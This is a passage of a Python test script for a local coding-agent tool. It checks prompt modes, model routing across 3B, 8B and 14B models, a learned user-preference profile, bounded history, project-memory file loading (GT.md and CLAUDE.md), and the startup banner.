import inspect as _inspect
from gt.llm import LLM
check("chat() default temperature is None (config-driven, not a hardcoded 0.3)",
      _inspect.signature(LLM.chat).parameters["temperature"].default is None)

print("\nlean chat prompt for no-tool turns (small talk + capability Qs)")
from gt.prompts import build_system as _bs
_chat_p = _bs("C:/w", "Windows", "TOOLDOCS", capabilities="search the web", mode="chat")
_work_p = _bs("C:/w", "Windows", "TOOLDOCS", capabilities="search the web", mode="work")
check("chat prompt is far smaller than the work prompt",
      len(_chat_p) < len(_work_p) / 2)
check("chat prompt still states capabilities", "search the web" in _chat_p)
check("chat prompt carries no tool docs", "TOOLDOCS" not in _chat_p)
check("work prompt carries the tool docs", "TOOLDOCS" in _work_p)
check("default mode is work (back-compat with 3-arg callers)",
      _bs("C:/w", "Windows", "TOOLDOCS")
      == _bs("C:/w", "Windows", "TOOLDOCS", mode="work"))
check("each mode is byte-stable (KV-cache safe)",
      _bs("C:/w", "Windows", "TOOLDOCS", capabilities="search the web",
          mode="chat") == _chat_p)

_lean_agent = Agent(llm=_StubLLM(), config=cfg, memory=_Stub(), router=_Stub(),
                    console=_quiet, improver=_Stub(),
                    approve=lambda *a, **k: True, ask=None)
check("a greeting drops to the lean prompt", _lean_agent._chat_only("hi there"))
check("'what can you do?' drops to the lean prompt",
      _lean_agent._chat_only("what can you do?"))
check("'can you use the internet?' drops to the lean prompt",
      _lean_agent._chat_only("can you use the internet?"))
check("'who are you?' drops to the lean prompt", _lean_agent._chat_only("who are you?"))
check("'what do you think?' drops to the lean prompt",
      _lean_agent._chat_only("what do you think about rust?"))
check("a greeting that ALSO asks to build keeps the full toolset",
      not _lean_agent._chat_only("hi can you build me an app"))
check("'hi, read main.py' keeps the full toolset",
      not _lean_agent._chat_only("hi read main.py"))
check("a plain build request keeps the full toolset",
      not _lean_agent._chat_only("make a todo app"))

print("\nlesson extraction is skipped on conversation (Ollama runner stays free)")
import time as _t2
class _CountImprover:
    def __init__(self): self.calls = 0
    def learn(self, *a, **k): self.calls += 1; return None
class _ProseLLM:
    last_metrics = None
    def chat(self, role, messages, **kw):
        r = "Hey! How can I help?"
        if kw.get("on_token"): kw["on_token"](r)
        return r
_ci = _CountImprover()
_chat_agent = Agent(llm=_ProseLLM(), config=cfg, memory=_Stub(), router=_Stub(),
                    console=_quiet, improver=_ci, approve=lambda *a, **k: True, ask=None)
_chat_agent.run("hi")
_t2.sleep(0.3)
check("no reviewer inference fires after a plain 'hi'", _ci.calls == 0)
_cw = _CountImprover()
_work_agent = Agent(llm=_StubLLM(), config=cfg, memory=_Stub(), router=_Stub(),
                    console=_quiet, improver=_cw, approve=lambda *a, **k: True, ask=None)
_work_agent.run("fix the bug in main.py")   # 1 successful tool step, routine
_t2.sleep(0.3)
check("a routine 1-step success does NOT fire the reviewer", _cw.calls == 0)
class _MultiLLM:                              # a genuinely multi-step task
    last_metrics = None
    def __init__(self): self.calls = 0
    def chat(self, role, messages, **kw):
        self.calls += 1
        r = ('```json\n{"tool":"list_dir","args":{"path":"."}}\n```'
             if self.calls <= 3 else "Done after several steps.")
        if kw.get("on_token"): kw["on_token"](r)
        return r
_cm = _CountImprover()
_multi_agent = Agent(llm=_MultiLLM(), config=cfg, memory=_Stub(), router=_Stub(),
                     console=_quiet, improver=_cm, approve=lambda *a, **k: True, ask=None)
_multi_agent.run("refactor the module across several files")
_t2.sleep(0.3)
check("a multi-step (>=3) task still runs lesson extraction", _cm.calls == 1)

print("\nworking history is bounded (prefill stays flat over a long session)")
_hist_agent = Agent(llm=_ProseLLM(), config=cfg, memory=_Stub(), router=_Stub(),
                    console=_quiet, improver=_Stub(), approve=lambda *a, **k: True, ask=None)
for _i in range(30):
    _hist_agent.run("hello there")
check("history never grows past the configured cap",
      len(_hist_agent.history) <= _hist_agent.max_history)
check("the cap keeps the most recent turns",
      _hist_agent.history[-1]["role"] == "assistant")

print("\npreference profile (analyst-learned, glass-box)")
from gt.profile import Profiler
class _AnalystLLM:
    def __init__(self, reply, served=("hermes3:3b",)):
        self.reply, self.served = reply, list(served)
    def chat(self, role, messages, **kw): return self.reply
    def list_models(self, base, **kw): return self.served
_pp = Path(__file__).resolve().parent / "_profile.json"
_pp.unlink(missing_ok=True)
prof = Profiler(_AnalystLLM("- Prefers Python + Flask\n- Terse answers\n"
                            "- snake_case files"), cfg, _pp)
check("analyst availability matches the EXACT served id (hermes3:3b)",
      prof.available() is True)
check("hermes3:8b does NOT satisfy a hermes3:3b analyst",
      Profiler(_AnalystLLM("x", served=("hermes3:8b",)), cfg, _pp).available() is False)
_obs, _msg = prof.update([{"user": "build a flask api", "outcome": "done"},
                          {"user": "keep answers short", "outcome": "ok"}])
check("update learns concrete preferences", any("Flask" in o for o in _obs))
check("update persists to disk", _pp.exists())
check("summary renders the profile as bullets", "- Prefers Python" in prof.summary())
check("generic advice is rejected as noise",
      prof._parse("- write clean code\n- follow best practices") == [])
check("a 'nothing learned' reply is treated as no change",
      prof._parse("No durable preferences yet.") == [])
check("parse caps at max_observations",
      len(prof._parse("\n".join(f"- pref {i}" for i in range(20)))) <= prof.max_obs)
_np = Profiler(_AnalystLLM("- x", served=("llama3.2:3b",)), cfg, _pp)
_o2, _m2 = _np.update([{"user": "hi", "outcome": "hey"}])
check("update no-ops with a pull hint when the analyst isn't installed",
      "ollama pull" in _m2)
prof.clear()
check("clear wipes the profile file", not _pp.exists())

_pw = build_system("C:/w", "Windows", "TOOLS", mode="work", profile="- Prefers Flask")
check("the learned profile is injected into the work prompt",
      "About this user" in _pw and "Prefers Flask" in _pw)
check("no profile section when the profile is empty",
      "About this user" not in build_system("C:/w", "Windows", "TOOLS", mode="work"))
check("the profile is injected into the lean chat prompt too",
      "Terse" in build_system("C:/w", "Windows", "TOOLS", mode="chat", profile="- Terse"))
check("a profile keeps each prompt mode byte-stable (cache-safe)",
      build_system("C:/w", "Windows", "TOOLS", mode="work", profile="- X")
      == build_system("C:/w", "Windows", "TOOLS", mode="work", profile="- X"))

_slagent = Agent(llm=_StubLLM(), config=cfg, memory=_Stub(), router=_Stub(),
                 console=_quiet, improver=_Stub(), approve=lambda *a, **k: True, ask=None)
_slagent.run("what files are here?")
check("agent records each turn in the session log for the analyst",
      bool(_slagent.session_log)
      and _slagent.session_log[-1]["user"] == "what files are here?")

print("\nrouter heuristics (no LLM call) — 3B-first speed ladder")
cfg.router["prefer_fast_on_slow"] = False   # test raw routing, hardware-independent
r = Router(llm=None, config=cfg)
check("router default is the resident 3B (tiny)", r.default_role == "tiny")
check("small talk -> tiny", r.route("hi") == "tiny")
check("everyday quick coding stays on the resident 3B (no swap)",
      r.route("fix the bug in main.py") == "tiny")
check("everyday frontend fix stays on the 3B",
      r.route("fix the css on my website") == "tiny")
check("hosting/deploy chatter stays on the 3B",
      r.route("deploy the server to port 5000") == "tiny")
check("architecture/planning -> brain 14B",
      r.route("design the architecture for a new app") == "brain")
check("very long spec -> brain", r.route("please " + "explain " * 100) == "brain")
check("new app with frontend+backend -> brain (the transcript case)",
      r.route("make a simple frontend and backend and host it") == "brain")
check("build a react app -> brain", r.route("build a react app") == "brain")

print("\nrouter escalates only substantial, ambiguous requests (3B classifier)")
class _RouteStub:
    """Stands in for the tiny classifier: returns a fixed label."""
    def __init__(self, label): self.label = label
    def chat(self, role, messages, **kw): return self.label
_long_code = ("Refactor the authentication module in my project to use JWT "
              "tokens instead of sessions, and update all the related "
              "middleware and route handlers across the whole codebase.")
_long_reason = ("I have a big pile of customer transaction records and I want "
                "to figure out which customers are likely to churn soon and "
                "understand the main drivers so we can act on it early enough.")
check("both escalation probes are past the escalate_len threshold",
      len(_long_code) > r.escalate_len and len(_long_reason) > r.escalate_len)
check("a substantial coding task escalates to the 8B (classifier: code)",
      Router(llm=_RouteStub("code"), config=cfg).route(_long_code) == "fast")
check("a substantial reasoning task escalates to the brain (classifier: complex)",
      Router(llm=_RouteStub("complex"), config=cfg).route(_long_reason) == "brain")
check("a long-but-simple message stays on the resident 3B",
      Router(llm=_RouteStub("simple"), config=cfg).route(_long_reason) == "tiny")
check("short everyday turns never call the classifier (stay on the 3B)",
      Router(llm=_RouteStub("complex"), config=cfg).route("fix the bug in main.py")
      == "tiny")

print("\nrouter prefers the 8B over the 14B on slow (CPU-only) machines")
from gt.machine import slow_for_large_models
check("x86 no-GPU box is slow for large models",
      slow_for_large_models({"os": "Windows 10", "arch": "AMD64", "vram_gb": None}))
check("an NVIDIA VRAM box is not slow",
      not slow_for_large_models({"os": "Windows 10", "arch": "AMD64", "vram_gb": 8}))
check("Apple Silicon (Metal GPU) is not flagged slow",
      not slow_for_large_models({"os": "Darwin 24.1.0", "arch": "arm64", "vram_gb": None}))
_rslow = Router(llm=None, config=cfg)
_rslow.prefer_fast = True
check("slow machine keeps a build on the resident 3B (8B/14B too slow there)",
      _rslow.route("design the architecture for a new app") == "tiny")
check("slow machine keeps a 'make me a game' build on the 3B too",
      _rslow.route("make me a snake game") == "tiny")
check("slow machine still answers everyday turns on the 3B",
      _rslow.route("fix the css on my website") == "tiny")
check("slow machine still sends small talk to tiny",
      _rslow.route("hi") == "tiny")
check("fast machine keeps brain for planning",
      r.route("design the architecture for a new app") == "brain")  # r has prefer_fast off

print("\nbuild requests are recognised (the flappy-bird miss)")
check("'create the famous game called flappy bird' routes as a build",
      r.route("create the famous game called flappy bird. i want to play it") == "brain")
check("'make me a todo app' routes as a build", r.route("make me a todo app") == "brain")
check("'build a snake game' routes as a build", r.route("build a snake game") == "brain")
check("a build with no code-hint word is WORK, not conversation",
      not _tagent._is_conversational("create the famous game called flappy bird")
      and not _tagent._is_conversational("make me a todo app")
      and not _tagent._is_conversational("build a snake game"))
check("plain chit-chat with a creation verb stays conversation",
      _tagent._is_conversational("write a poem")
      and _tagent._is_conversational("make me laugh"))

print("\n/mode makes behaviour strict (chat/code/plan override the classifier)")
_rr = Router(llm=None, config=cfg)          # prefer_fast off (set above)
_magent = Agent(llm=_StubLLM(), config=cfg, memory=_Stub(), router=_rr,
                console=_quiet, improver=_Stub(), approve=lambda *a, **k: True, ask=None)
check("default mode is auto", _magent.mode == "auto")
check("set_mode normalises aliases ('coding' -> code)",
      _magent.set_mode("coding") == "code")
check("an unknown mode is rejected and leaves the mode unchanged",
      _magent.set_mode("banana") is None and _magent.mode == "code")
_magent.set_mode("chat")
_r1, _c1, _o1, _p1 = _magent._resolve_turn("build me a todo app")
check("chat mode forces conversation even on a build request",
      _c1 is True and _o1 is True and _p1 == "chat" and _r1 == "tiny")
_magent.set_mode("code")
_r2, _c2, _o2, _p2 = _magent._resolve_turn("hi")
check("code mode forces work (tools) even on small talk",
      _c2 is False and _o2 is False and _p2 == "work")
_magent.set_mode("plan")
_r3, _c3, _o3, _p3 = _magent._resolve_turn("make a game")
check("plan mode uses the plan prompt", _p3 == "plan" and _c3 is False)
_magent.set_mode("auto")
check("auto mode classifies again (a greeting is chat)",
      _magent._resolve_turn("hi")[1] is True)
_plan_prompt = build_system("C:/w", "Windows", "TOOLS", mode="plan")
check("plan-mode prompt carries the plan-first directive + the tools",
      "PLAN MODE" in _plan_prompt and "do NOT build yet" in _plan_prompt
      and "TOOLS" in _plan_prompt)

print("\nproject memory (GT.md — the CLAUDE.md layer, failure mode #4)")
import tempfile
from gt import project_memory as _pm

with tempfile.TemporaryDirectory() as _td:
    _outer = Path(_td).resolve() / "outer"
    _repo = _outer / "repo"
    _src = _repo / "src"
    _src.mkdir(parents=True)
    (_repo / ".git").mkdir()
    (_outer / "GT.md").write_text("outside the repo", encoding="utf-8")
    check("a GT.md ABOVE the repo root is ignored",
          _pm.find_project_file(_src) is None)
    (_repo / "CLAUDE.md").write_text("claude instructions", encoding="utf-8")
    check("falls back to a repo's existing CLAUDE.md",
          (_pm.find_project_file(_src) or Path(".")).name == "CLAUDE.md")
    (_repo / "GT.md").write_text("- use pytest", encoding="utf-8")
    check("GT.md wins over CLAUDE.md, found from a subfolder",
          _pm.find_project_file(_src) == _repo / "GT.md")

    _user = Path(_td).resolve() / "user-GT.md"
    _user.write_text("- tabs never spaces", encoding="utf-8")
    _text, _files = _pm.load(_src, user_file=_user)
    check("merged block = user layer then project layer",
          _text.index("tabs never spaces") < _text.index("use pytest"))
    check("load reports exactly the files it read",
          _files == [_user, _repo / "GT.md"])
    (_repo / "GT.local.md").write_text("- port 5001 locally", encoding="utf-8")
    _text2, _files2 = _pm.load(_src, user_file=_user)
    check("GT.local.md overrides ride last",
          len(_files2) == 3 and "port 5001 locally" in _text2
          and _text2.index("use pytest") < _text2.index("port 5001"))
    _big, _ = _pm.load(_src, max_chars=40, user_file=_user)
    check("merged block is capped at max_chars",
          len(_big) < 150 and "truncated" in _big)
    check("missing user file degrades to project-only",
          _pm.load(_src, user_file=Path(_td).resolve() / "nope.md")[1]
          == [_repo / "GT.md", _repo / "GT.local.md"])

    _noted = _pm.append_note(_src, "always run the linter")
    check("# note appends to the existing GT.md",
          _noted == _repo / "GT.md"
          and "- always run the linter" in _noted.read_text(encoding="utf-8"))

with tempfile.TemporaryDirectory() as _td2:
    _r2 = Path(_td2).resolve() / "r2"
    _r2.mkdir()
    (_r2 / ".git").mkdir()
    (_r2 / "CLAUDE.md").write_text("theirs — do not touch", encoding="utf-8")
    _p2 = _pm.append_note(_r2, "gt-specific note")
    check("a note never mutates a foreign CLAUDE.md",
          _p2 == _r2 / "GT.md"
          and (_r2 / "CLAUDE.md").read_text(encoding="utf-8")
          == "theirs — do not touch")
    check("fresh GT.md is created with a header + the note",
          _p2.read_text(encoding="utf-8").startswith("# GT.md")
          and "- gt-specific note" in _p2.read_text(encoding="utf-8"))

with tempfile.TemporaryDirectory() as _td3:
    _w = Path(_td3).resolve() / "w"
    _w.mkdir()
    (_w / ".git").mkdir()
    _p3 = _pm.append_note(_w, "first note")
    check("no project file at all → GT.md lands in the workspace",
          _p3 == _w / "GT.md"
          and "- first note" in _p3.read_text(encoding="utf-8"))

_wm = build_system("C:/w", "Windows", "TOOLS", project_memory="USE PYTEST ALWAYS")
check("work prompt carries the project memory block",
      "USE PYTEST ALWAYS" in _wm and "Project memory" in _wm)
check("chat prompt stays lean — no project memory",
      "USE PYTEST ALWAYS" not in build_system(
          "C:/w", "Windows", "TOOLS", mode="chat",
          project_memory="USE PYTEST ALWAYS"))
_pl = build_system("C:/w", "Windows", "TOOLS", mode="plan",
                   project_memory="USE PYTEST ALWAYS")
check("plan prompt carries it too", "USE PYTEST ALWAYS" in _pl
      and "PLAN MODE" in _pl)
check("agent loads project memory at startup",
      isinstance(_agent.project_memory, str)
      and isinstance(_agent.project_memory_files, list))

print("\nstartup banner renders (3D wordmark + author + build)")
from gt import banner as _banner
_bc = Console(file=io.StringIO(), force_terminal=False)
_banner.render(_bc, "9.9.9")
_bout = _bc.file.getvalue()
check("banner names the author", "Sarvesh Singh" in _bout)
check("banner shows the build version", "9.9.9" in _bout)
check("banner says 3B-first", "3B-first" in _bout)
_orig_supports = _banner._supports_block
_banner._supports_block = lambda c: False        # force the legacy-terminal path
_fc = Console(file=io.StringIO(), force_terminal=False)
_banner.render(_fc, "9.9.9")
_fout = _fc.file.getvalue()
_banner._supports_block = _orig_supports
try:
    _fout.encode("cp1252"); _legacy_ok = True    # no block chars in the fallback
except UnicodeEncodeError:
    _legacy_ok = False
check("ascii fallback encodes cleanly on a legacy Windows code page (cp1252)",
      _legacy_ok)
check("ascii fallback still names the author", "Sarvesh Singh" in _fout)

print(f"\n{'='*40}\n{ok} passed, {fail} failed")
sys.exit(1 if fail else 0)
